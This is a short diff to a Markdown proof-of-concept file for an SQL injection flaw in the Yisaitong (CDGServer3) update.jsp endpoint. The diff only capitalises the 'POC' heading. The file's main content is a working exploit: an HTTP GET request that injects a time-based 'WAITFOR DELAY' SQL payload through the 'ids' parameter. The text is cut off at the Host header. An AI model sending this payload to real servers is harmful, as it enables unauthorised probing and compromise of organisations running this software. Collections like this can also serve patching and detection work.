@@ -1,7 +1,7 @@
 ## 亿赛通update接口sql注入
 
 
-## poc
+## POC
 ```
 GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3);WAITFOR%20DELAY%20%270:0:1%27-- HTTP/1.1
 Host: 
